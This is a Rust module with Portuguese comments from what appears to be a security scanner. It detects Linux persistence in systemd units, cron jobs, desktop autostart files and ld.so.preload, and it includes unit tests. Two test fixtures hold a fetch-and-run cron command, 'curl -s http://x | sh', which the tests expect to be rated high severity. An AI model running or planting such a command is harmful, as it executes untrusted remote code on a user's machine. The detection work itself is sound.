//! Persistência no Linux: systemd, cron, autostart de desktop e `ld.so.preload`.
//! A leitura é feita por funções puras (testadas em qualquer sistema); `scan` só percorre as pastas.
// Fora do Linux só os testes usam este módulo.
#![cfg_attr(not(unix), allow(dead_code))]
use std::{
    fs,
    path::{Path, PathBuf},
};

use crate::classify::classify_linux;
use crate::finding::{Finding, Severity};

const SCANNER: &str = "persistencia";

/// Comandos de `ExecStart*` de uma unit do systemd, sem os prefixos especiais (`-@:+!`).
pub fn parse_unit_commands(text: &str) -> Vec<String> {
    text.lines()
        .map(str::trim)
        .filter(|l| !l.starts_with('#') && !l.starts_with(';'))
        .filter_map(|l| l.split_once('='))
        .filter(|(key, _)| matches!(key.trim(), "ExecStart" | "ExecStartPre" | "ExecStartPost"))
        .map(|(_, value)| {
            value
                .trim()
                .trim_start_matches(['-', '@', ':', '+', '!'])
                .trim()
                .to_string()
        })
        .filter(|c| !c.is_empty())
        .collect()
}

/// Comandos de um crontab. `user_field`: `/etc/crontab` e `/etc/cron.d/*` têm uma coluna de usuário.
pub fn parse_crontab(text: &str, user_field: bool) -> Vec<String> {
    text.lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .filter_map(|line| {
            let tokens: Vec<&str> = line.split_whitespace().collect();
            let first = tokens.first()?;
            // Linha de variável de ambiente (`PATH=/usr/bin`): o nome não tem espaços nem barras.
            if first.split_once('=').is_some_and(|(k, _)| {
                !k.is_empty() && k.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
            }) {
                return None;
            }
            let time_fields = if first.starts_with('@') { 1 } else { 5 };
            let skip = time_fields + usize::from(user_field);
            (tokens.len() > skip).then(|| tokens[skip..].join(" "))
        })
        .collect()
}

/// `Exec=` de um arquivo `.desktop` de autostart; `None` se estiver desativado ou sem `Exec`.
pub fn parse_desktop_exec(text: &str) -> Option<String> {
    let mut exec = None;
    for line in text.lines().map(str::trim) {
        match line.split_once('=') {
            Some(("Hidden", v)) | Some(("X-GNOME-Autostart-enabled", v))
                if (line.starts_with("Hidden") && v.trim() == "true")
                    || (line.starts_with("X-GNOME") && v.trim() == "false") =>
            {
                return None;
            }
            Some(("Exec", v)) if exec.is_none() => exec = Some(v.trim().to_string()),
            _ => {}
        }
    }
    exec.filter(|e| !e.is_empty())
}

/// Bibliotecas listadas em `/etc/ld.so.preload`.
pub fn parse_preload(text: &str) -> Vec<String> {
    text.lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .flat_map(|l| l.split_whitespace().map(str::to_string).collect::<Vec<_>>())
        .collect()
}

fn finding(location: &Path, name: String, target: String) -> Finding {
    let (severity, reason) = classify_linux(&target);
    Finding {
        scanner: SCANNER,
        location: location.display().to_string(),
        name,
        target,
        severity,
        reason,
    }
}

pub fn scan() -> Vec<Finding> {
    let mut out = Vec::new();
    scan_systemd(&mut out);
    scan_cron(&mut out);
    scan_autostart(&mut out);
    scan_preload(&mut out);
    out
}

fn files_in(dir: &Path) -> Vec<PathBuf> {
    fs::read_dir(dir)
        .map(|rd| rd.flatten().map(|e| e.path()).collect())
        .unwrap_or_default()
}

fn homes() -> Vec<PathBuf> {
    let mut homes: Vec<PathBuf> = std::env::var_os("HOME")
        .map(PathBuf::from)
        .into_iter()
        .collect();
    homes.extend(files_in(Path::new("/home")));
    homes.sort();
    homes.dedup();
    homes
}

/// Units adicionadas pelo administrador ou pelo usuário. As que apontam para os arquivos da
/// própria distribuição (`/usr/lib/systemd`) são ignoradas: seriam milhares.
fn scan_systemd(out: &mut Vec<Finding>) {
    let mut dirs = vec![
        PathBuf::from("/etc/systemd/system"),
        PathBuf::from("/etc/systemd/user"),
    ];
    dirs.extend(homes().into_iter().map(|h| h.join(".config/systemd/user")));
    for dir in dirs {
        for path in files_in(&dir)
            .into_iter()
            .filter(|p| p.extension().is_some_and(|e| e == "service"))
        {
            let real = fs::canonicalize(&path).unwrap_or_else(|_| path.clone());
            if real.starts_with("/usr/lib/systemd") || real.starts_with("/lib/systemd") {
                continue;
            }
            let Ok(text) = fs::read_to_string(&real) else {
                continue;
            };
            let name = path
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_default();
            out.extend(
                parse_unit_commands(&text)
                    .into_iter()
                    .map(|c| finding(&dir, name.clone(), c)),
            );
        }
    }
}

fn scan_cron(out: &mut Vec<Finding>) {
    let mut sources = vec![(PathBuf::from("/etc/crontab"), true)];
    sources.extend(
        files_in(Path::new("/etc/cron.d"))
            .into_iter()
            .map(|p| (p, true)),
    );
    let spool = [
        Path::new("/var/spool/cron/crontabs"),
        Path::new("/var/spool/cron"),
    ]
    .into_iter()
    .find(|d| d.is_dir());
    if let Some(dir) = spool {
        if fs::read_dir(dir).is_err() {
            out.push(Finding {
                scanner: SCANNER,
                location: dir.display().to_string(),
                name: "Crontabs de usuários NÃO verificados".into(),
                target: String::new(),
                severity: Severity::Info,
                reason: "Sem acesso à pasta de crontabs; rode como root para verificá-los",
            });
        }
        sources.extend(
            files_in(dir)
                .into_iter()
                .filter(|p| p.is_file())
                .map(|p| (p, false)),
        );
    }
    for (path, user_field) in sources {
        let Ok(text) = fs::read_to_string(&path) else {
            continue;
        };
        let name = path
            .file_name()
            .map(|n| n.to_string_lossy().into_owned())
            .unwrap_or_default();
        let parent = path.parent().unwrap_or(Path::new("/"));
        out.extend(
            parse_crontab(&text, user_field)
                .into_iter()
                .map(|c| finding(parent, name.clone(), c)),
        );
    }
}

fn scan_autostart(out: &mut Vec<Finding>) {
    let mut dirs = vec![PathBuf::from("/etc/xdg/autostart")];
    dirs.extend(homes().into_iter().map(|h| h.join(".config/autostart")));
    for dir in dirs {
        for path in files_in(&dir)
            .into_iter()
            .filter(|p| p.extension().is_some_and(|e| e == "desktop"))
        {
            let Ok(text) = fs::read_to_string(&path) else {
                continue;
            };
            if let Some(exec) = parse_desktop_exec(&text) {
                let name = path
                    .file_name()
                    .map(|n| n.to_string_lossy().into_owned())
                    .unwrap_or_default();
                out.push(finding(&dir, name, exec));
            }
        }
    }
}

/// `ld.so.preload` carrega uma biblioteca em todo processo: truque clássico de rootkit.
/// Raro em sistemas comuns, então qualquer entrada é pelo menos SUSPEITA.
fn scan_preload(out: &mut Vec<Finding>) {
    let path = Path::new("/etc/ld.so.preload");
    let Ok(text) = fs::read_to_string(path) else {
        return;
    };
    for lib in parse_preload(&text) {
        let mut f = finding(path, "ld.so.preload".into(), lib);
        if f.severity < Severity::Suspicious {
            f.severity = Severity::Suspicious;
            f.reason = "Biblioteca carregada em todo processo (técnica comum de rootkit)";
        }
        out.push(f);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn unit_commands_strip_prefixes_and_ignore_other_keys() {
        let t = "[Service]\nExecStart=/usr/bin/app --x\nExecStartPre=-/bin/true\n# ExecStart=/no\nExecStop=/bin/stop\nUser=root\nExecStart=\n";
        assert_eq!(
            parse_unit_commands(t),
            vec!["/usr/bin/app --x", "/bin/true"]
        );
    }

    #[test]
    fn crontab_system_format_skips_env_comments_and_user_column() {
        let t = "# m h dom mon dow user command\nSHELL=/bin/sh\nPATH=/usr/bin:/bin\n17 * * * * root cd / && run-parts /etc/cron.hourly\n@reboot root /opt/x/start.sh  --fast\n";
        assert_eq!(
            parse_crontab(t, true),
            vec![
                "cd / && run-parts /etc/cron.hourly",
                "/opt/x/start.sh --fast"
            ]
        );
    }

    #[test]
    fn crontab_user_format_has_no_user_column() {
        assert_eq!(
            parse_crontab("*/5 * * * * curl -s http://x | sh\n@reboot /tmp/a\n", false),
            vec!["curl -s http://x | sh", "/tmp/a"]
        );
    }

    #[test]
    fn crontab_incomplete_lines_do_not_panic() {
        assert!(parse_crontab("* * *\n@reboot\n=\n\n", true).is_empty());
    }

    #[test]
    fn desktop_exec_is_read_and_disabled_entries_are_skipped() {
        assert_eq!(
            parse_desktop_exec("[Desktop Entry]\nName=X\nExec=/opt/x/x --tray\n").as_deref(),
            Some("/opt/x/x --tray")
        );
        assert_eq!(
            parse_desktop_exec("[Desktop Entry]\nExec=/a\nHidden=true\n"),
            None
        );
        assert_eq!(
            parse_desktop_exec("[Desktop Entry]\nExec=/a\nX-GNOME-Autostart-enabled=false\n"),
            None
        );
        assert_eq!(
            parse_desktop_exec("[Desktop Entry]\nHidden=false\nExec=/a\n").as_deref(),
            Some("/a")
        );
        assert_eq!(parse_desktop_exec("[Desktop Entry]\nName=X\n"), None);
    }

    #[test]
    fn preload_lists_libraries_and_ignores_comments() {
        assert_eq!(
            parse_preload("# c\n/lib/a.so /lib/b.so\n\n"),
            vec!["/lib/a.so", "/lib/b.so"]
        );
    }

    #[test]
    fn findings_use_the_linux_classifier() {
        let f = finding(
            Path::new("/etc/cron.d"),
            "x".into(),
            "curl -s http://x | sh".into(),
        );
        assert_eq!((f.severity, f.scanner), (Severity::High, "persistencia"));
    }
}
